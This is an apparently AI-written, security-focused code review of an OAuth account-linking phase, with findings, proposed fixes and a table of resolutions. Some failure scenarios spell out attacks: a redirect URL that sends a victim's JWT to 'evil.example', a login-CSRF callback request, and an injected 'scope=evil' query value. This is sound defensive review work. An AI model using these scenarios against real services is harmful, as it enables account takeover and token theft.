---
phase: 06-oauth-account-linking
reviewed: 2026-07-07T04:05:54Z
depth: deep
advisory: true
reviewer: gsd-code-reviewer (adversarial, security-focused)
diff_base: 4a9bf6f
files_reviewed: 7
files_reviewed_list:
  - api/app/auth/merge.py
  - api/app/auth/routes.py
  - api/app/auth/mastodon.py
  - api/app/auth/config.py
  - api/app/models.py
  - api/main.py
  - api/alembic/versions/900000000007_pending_account_links.py
findings:
  critical: 0
  high: 2
  medium: 2
  low: 4
  total: 8
status: resolved
---

# Phase 06: OAuth & Account Linking — Advisory Code Review

**Reviewed:** 2026-07-07T04:05:54Z
**Depth:** deep (cross-file trace of the auth trust boundary)
**Files reviewed:** 7 (auth core + migration/model/bootstrap)
**Status:** issues-found (advisory — does not block the phase)

## Summary

The headline nOAuth / account-takeover defense in `merge.py::resolve_auth` is **sound**. I
traced every path that mints a JWT or attaches a provider:

- A provider-verified email that matches an existing account produces a `PendingAccountLink`
  **OFFER only** — never an attach, never a new-user, never a JWT (merge.py:269-284).
- Consuming an offer requires re-auth through an **already-linked** provider owned by the
  **same** `existing_user_id` (`freshly is None or str(freshly.id) != str(pending.existing_user_id)`
  at merge.py:196-205). Because a merge offer can only be *created* by an identity that
  controls the verified email, and can only be *consumed* by proving ownership of an
  already-linked provider, there is no path where an attacker who does not control the
  victim's verified email or an existing linked provider can attach their identity to, or
  mint a JWT for, the victim's account. The single-use (`consumed_at`) and TTL
  (`expires_at`, 15 min) guards are enforced before any attach. The mid-phase
  `ProviderAlreadyLinkedError` guard (merge.py:234-237) correctly closes the explicit-link
  variant. **No new account-takeover was found in the merge resolver.**
- SSRF: `validate_mastodon_domain` covers dual-stack `getaddrinfo` and rejects
  private/loopback/link-local/multicast/reserved for both families; `httpx.AsyncClient`
  defaults to `follow_redirects=False`, so no redirect chase. The DNS-rebinding TOCTOU is
  the documented, accepted residual — not re-reported.
- JWT/secrets: Apple ES256 client secret is `exp = now + 300` and regenerated per exchange
  (routes.py:324-336); the app JWT and the Apple ID-token decode both pin algorithms and
  verify iss/aud/signature. No key/secret material is written to logs or error bodies.
- Config-drift: `ALLOW_LOCALHOST_BYPASS = OVID_ENV != "production"` with an import-time
  boot assertion and a call-time module-attribute read in `indieauth_login`
  (routes.py:491); IndieAuth is off-by-default behind `OVID_ENABLE_INDIEAUTH`
  (main.py). This layer is correct.

The findings below are real and demonstrable, but the two HIGH items are **pre-existing**
weaknesses in the shared callback plumbing (unchanged by this phase's diff) that the phase
now routes all five providers — including the new merge flow — through. They are in-scope
because they directly undercut the account-linking trust model this phase hardens.

## Narrative Findings (AI reviewer)

### HIGH

#### HI-01: Apple Sign-In callback never verifies the OAuth `state` → login CSRF / auth-code injection
**File:** `api/app/auth/routes.py:378-465` (state generated at :362-363, never checked)
**Issue:** `apple_login` mints `state = secrets.token_urlsafe(32)` and stores it in
`request.session["apple_state"]` (:363), but `apple_callback` **never reads or compares**
`request.query_params.get("state")` against the session value. Confirmed by grep:
`apple_state` is written once (:363) and read **nowhere**. Contrast `indieauth_callback`
(:540-542) and `mastodon_callback` (:726-727), which both enforce it. This phase added the
`pending_link_id` merge-routing wiring to `apple_login` (:358-359), so the CSRF-able
callback now also drives the account-merge consume path.
**Failure scenario:** An attacker starts an Apple auth in their own browser, obtains a valid
`code` bound to *their* Apple identity, then cross-site forces the victim's authenticated
browser to `GET /v1/auth/apple/callback?code=<attacker_code>`. With no state binding the
victim's session exchanges the attacker's code, decodes the attacker's ID token, and
`finalize_auth` either (a) logs the victim into the attacker-controlled Apple identity
(session fixation / login CSRF — victim now edits data under an account the attacker also
controls) or (b) if the victim's session carries a `pending_link_id`, consumes it against
the attacker-supplied identity. Missing `state` is a textbook OAuth CSRF hole.
**Fix:**
```python
# in apple_callback, immediately after reading `code`
state = request.query_params.get("state")
expected_state = request.session.pop("apple_state", None)
if not expected_state or state != expected_state:
    raise HTTPException(status_code=401, detail={"error": "auth_failed", "reason": "State mismatch"})
```

#### HI-02: `web_redirect_uri` accepts any http(s) host and the fresh OVID JWT is appended to it → open redirect + token exfiltration (account takeover)
**File:** `api/app/auth/routes.py:156-162` (sink); validation at :184, :354, :479, :609, :681
**Issue:** Every login endpoint validates `web_redirect_uri` by **scheme only**
(`if not web_redirect_uri.startswith(("http://", "https://"))`) with **no host allowlist**,
then stores it in the session. On success `finalize_auth` does
`redirect_url = f"{web_redirect_uri}{sep}{urlencode({'token': jwt_token})}"` and issues a 302.
The 30-day bearer JWT (jwt.py: `exp = now + 30d`) is placed in the query string of an
attacker-chooseable absolute URL.
**Failure scenario:** Attacker sends the victim
`https://oviddb.org/v1/auth/github/login?web_redirect_uri=https://evil.example`. The victim
authenticates with their *real* GitHub. `finalize_auth` 302-redirects the browser to
`https://evil.example?token=<victim_JWT>`; the attacker's server reads the token from the
query string (and/or `Referer`) and now holds a 30-day credential for the victim's account —
full takeover, no provider compromise required. Applies to all five wired providers.
**Fix:** Validate the host against a configured allowlist (e.g. the deployment's web
origin) before storing:
```python
from urllib.parse import urlparse
allowed = {urlparse(o).netloc for o in os.environ.get("WEB_REDIRECT_ALLOWLIST", "").split(",") if o}
if urlparse(web_redirect_uri).netloc not in allowed:
    raise HTTPException(status_code=400, detail={"error": "invalid_redirect_uri", "reason": "Host not allowed"})
```
Prefer delivering the token via URL fragment or a short-lived one-time code rather than a
query parameter that lands in logs/Referer.

### MEDIUM

#### ME-01: Authorize URLs built by manual f-string join without URL-encoding
**File:** `api/app/auth/routes.py:373` (Apple), `:524` (IndieAuth), `:709` (Mastodon)
**Issue:** `qs = "&".join(f"{k}={v}" for k, v in params.items())` interpolates values raw.
`redirect_uri` contains `://` and `/`; Apple's `scope="name email"` contains a space;
IndieAuth's `me=<validated_url>` can itself contain `://`, `?`, `&`. Unencoded reserved
characters produce a malformed authorize URL, and a `me`/redirect value containing `&`/`?`
can truncate or inject additional query parameters into the outbound authorize request.
**Failure scenario:** An IndieAuth `me` URL of the form `https://a.example/?x=1&scope=evil`
is spliced verbatim into the authorization request, corrupting `state`/`scope` boundaries;
the Apple `scope=name email` raw space yields an invalid request some providers reject.
**Fix:** `from urllib.parse import urlencode; qs = urlencode(params)` at each site.

#### ME-02: Merge-offer 409 body leaks internal `existing_user_id` and confirms account/email existence
**File:** `api/app/auth/routes.py:142-151`
**Issue:** The offer response returns `"existing_user_id": str(...)` alongside
`pending_link_id`. The client only needs `pending_link_id` to drive the re-auth; exposing
the internal user UUID plus the existence signal enables user/email enumeration (submit a
candidate email via any verifying provider and observe 409-with-existing_user_id vs. login).
**Failure scenario:** Attacker enumerates which emails already have OVID accounts and
harvests their stable internal UUIDs without authenticating as those users.
**Fix:** Return only `pending_link_id` (and a generic `error`); drop `existing_user_id`
from the body.

### LOW

#### LO-01: Offer consume is not atomic — concurrent double-consume can surface as an uncaught 500
**File:** `api/app/auth/merge.py:187-217`
**Issue:** The `consumed_at is None` check (:187) and the attach (:209-216) are not guarded
by `SELECT ... FOR UPDATE` or an atomic `UPDATE ... WHERE consumed_at IS NULL`. Two
concurrent requests presenting the same valid `pending_link_id` both pass the check; the
second `UserOAuthLink` insert violates `uq_oauth_provider_id` (models.py:389) and raises
`IntegrityError`, which is uncaught in `finalize_auth` → HTTP 500 instead of a clean 409.
The `pending_link_id` is an unguessable UUIDv4 within a 15-min TTL, so exploitability is
low, but the single-use guarantee is enforced by a read-then-write race, not the DB.
**Fix:** Make consume atomic — `UPDATE pending_account_links SET consumed_at=now() WHERE
id=:id AND consumed_at IS NULL` and treat `rowcount==0` as already-consumed, or
`SELECT ... FOR UPDATE` the row before the check.

#### LO-02: Raw exception strings reflected into client error responses
**File:** `api/app/auth/mastodon.py:84`; `api/app/auth/routes.py:790`
**Issue:** `detail={... "reason": f"Connection error: {str(e)}"}` (mastodon.py) and
`detail={"error": "bad_gateway", "reason": str(e)}` (routes.py mastodon_callback) echo the
raw exception to the caller. For outbound calls to a user-supplied Mastodon `domain`, the
exception text can leak internal DNS/host/connection details (a mild SSRF-adjacent info
leak). `resp.text[:200]` at routes.py:575 is log-only and fine.
**Fix:** Return a generic reason to the client; log `str(e)` server-side only.

#### LO-03: Unused import `ec`
**File:** `api/app/auth/routes.py:12`
**Issue:** `from cryptography.hazmat.primitives.asymmetric import ec` is imported but never
used (`ec.` appears nowhere; key loading uses `serialization.load_pem_private_key`). Dead
import.
**Fix:** Remove the import.

#### LO-04: Legacy `user_upsert` path and a stray `users.py.patch` remain in the tree
**File:** `api/app/auth/users.py` (whole module); `api/app/auth/users.py.patch`
**Issue:** Production callbacks now route exclusively through `resolve_auth`
(routes.py dropped the `user_upsert`/`EmailConflictError` imports). `user_upsert` and
`EmailConflictError` are no longer used by production code — only by a direct unit test
(`api/tests/test_auth_linking.py:550-553`) — leaving two parallel identity-resolution
implementations with divergent trust logic (the legacy one still hardcodes
`email_verified = provider == "github"` at users.py:84 and lacks the nOAuth offer gate).
Keeping it invites a future caller from wiring the unsafe path back in. Separately,
`api/app/auth/users.py.patch` is a tracked stray patch artifact (matches the CLAUDE.md
"debug/fix scripts committed" anti-pattern). Both predate this phase's diff.
**Fix:** Delete `users.py.patch`; retire `user_upsert`/`EmailConflictError` (and the test
that exercises them) once nothing depends on them, or add a module docstring marking it
deprecated to prevent reuse.

## Notes / explicitly cleared (no finding)

- **Merge resolver trust boundary** (merge.py:184-298): verified — no silent merge/attach or
  wrong-account JWT path. Direction of attach is always current-verified-login → matching
  owner, and consume always requires already-linked-provider ownership proof.
- **SSRF dual-stack + reserved-range coverage** (mastodon.py:30-50) and **no redirect
  following** (httpx default): verified adequate. DNS-rebinding TOCTOU is the documented
  accepted residual — not re-reported.
- **Apple ES256 secret ~300s + per-exchange rotation** (routes.py:324-336) and **Apple
  ID-token decode** pinning `algorithms=["RS256"]`, `audience`, `issuer` (routes.py:432-439):
  verified.
- **Google/GitHub `email_verified` sourcing** (routes.py:242-256, :655): GitHub reads the
  primary+verified entry from `/user/emails`; Google reads the authlib-verified
  `userinfo.email_verified`. Both correct.
- **`OVID_ENV` / `ALLOW_LOCALHOST_BYPASS` derivation + boot assertion** (config.py:23-41)
  and **IndieAuth off-by-default gate** (main.py): verified consistent.

---

_Reviewed: 2026-07-07T04:05:54Z_
_Reviewer: Claude (gsd-code-reviewer) — advisory, security-focused_
_Depth: deep_

## Resolution (all findings remediated)

Per project NEVER-DEFER policy, every finding below was fixed inline (not deferred/ticketed) with accompanying regression tests before phase closeout.

| Finding | Description | Fix Commit | Note |
| ------- | ------------ | ---------- | ---- |
| HI-01 | Apple callback never verified OAuth `state` (login CSRF / auth-code injection) | `cd01017` | `apple_callback` now reads `request.query_params["state"]`, pops the session-stored `apple_state`, and rejects on mismatch before any code exchange. |
| HI-02 | `web_redirect_uri` accepted any http(s) host; fresh JWT appended → open redirect + token exfiltration | `0930c70` | Host validated against the `CORS_ORIGINS` allowlist (fail-closed) via one shared helper wired into all 5 login sites (GitHub, Google, Apple, IndieAuth, Mastodon). |
| ME-01 | Authorize URLs built by manual f-string join, no URL-encoding | `7a4f926` | All three outbound authorize-request builders (Apple, IndieAuth, Mastodon) now use `urlencode` for the query string. |
| ME-02 | Merge-offer 409 body leaked internal `existing_user_id`, enabling account/email enumeration | `c46a640` | `existing_user_id` dropped from the 409 response body; only `pending_link_id` and a generic error are returned. |
| LO-01 | Offer consume was read-then-write, not atomic — concurrent double-consume could surface as an uncaught 500 | `bc89dea` | Consume is now a single atomic `UPDATE ... WHERE consumed_at IS NULL`; a zero-rowcount result is treated as already-consumed. |
| LO-02 | Raw exception strings reflected into client error responses (mild info leak on user-supplied Mastodon domain) | `a6aab1d` | Clients now receive a generic reason; the raw exception is logged server-side only. |
| LO-03 | Unused `ec` import in `routes.py` | `a1b6a7c` | Dead import removed. |
| LO-04 | Stray `users.py.patch` artifact + dead, less-safe `user_upsert`/`EmailConflictError` path left in tree | `bcb0ebd` | `users.py.patch` deleted; the unused legacy identity-resolution path (`user_upsert`/`EmailConflictError`) retired. |

**Verification after remediation:** full `api` suite is **400 passed, 0 warnings**. Both HIGH-severity account-takeover vectors — open-redirect JWT exfiltration (HI-02) and Apple login-CSRF (HI-01) — are closed.
